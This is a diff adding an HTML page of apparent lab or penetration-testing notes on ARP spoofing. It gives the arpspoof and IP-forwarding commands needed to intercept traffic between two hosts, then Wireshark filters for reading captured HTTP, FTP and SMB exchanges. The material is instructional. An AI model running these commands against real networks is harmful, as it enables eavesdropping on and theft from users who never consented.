@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>arpspoof: sniff traffic between hosts</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>arpspoof: sniff traffic between hosts</h1><br/><br /><br />Enable Ip Forwarding on the Attacker System<br /><div class="codebox"><div class="codebox">echo&nbsp;1&nbsp;&gt;&nbsp;/proc/sys/net/ipv4/ip_forward</div></div><br /><br />1. <strong>Capture/Sniff traffic between 172.16.5.5 and 172.16.5.1</strong><br />Send the following commands in two different terminals. Arpspoof will keep sending ARP packets to our targets in order to poison the<br />ARP table of both hosts.<br /><div class="codebox"><div class="codebox">arpspoof&nbsp;-i&nbsp;tap0&nbsp;-t&nbsp;172.16.5.5&nbsp;-r&nbsp;172.16.5.1</div></div><br />    <a href=""><img src="images/2111-1.png" alt="images/2111-1.png" /></a><br />  <br /><div class="codebox"><div class="codebox">arpspoof&nbsp;-i&nbsp;tap0&nbsp;-t&nbsp;172.16.5.1&nbsp;-r&nbsp;172.16.5.5</div></div><br />    <a href=""><img src="images/2111-2.png" alt="images/2111-2.png" /></a><br /><br />2. <strong>We can now analyze the traffic from Wireshark</strong><br />    Statistics → Protocol Hierarchy, to understand the type of traffic exchanged between the hosts<br />    <a href=""><img src="images/2111-3.png" alt="images/2111-3.png" /></a><br />   ◇ We can filter by:<br />       <div class="codebox"><div class="codebox">http.request.method&nbsp;==&nbsp;&quot;GET&quot;<br />http.request.method&nbsp;==&nbsp;&quot;POST&quot;<br />ftp<br />smb<br />smb.file&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#for&nbsp;file&nbsp;transmitted&nbsp;fia&nbsp;SMB<br /></div></div><br />       If we have found an interesting request on Wireshark:<br />       Right click on the packet → Follow TCP Stream<br />       <a href=""><img src="images/2111-4.png" alt="images/2111-4.png" /></a><br />       <span style="color:#ff0000;">commands issued by the user are in red</span><br />       <span style="color:#1e90ff;">server responses are in blue</span></div>
+</body>
+</html>
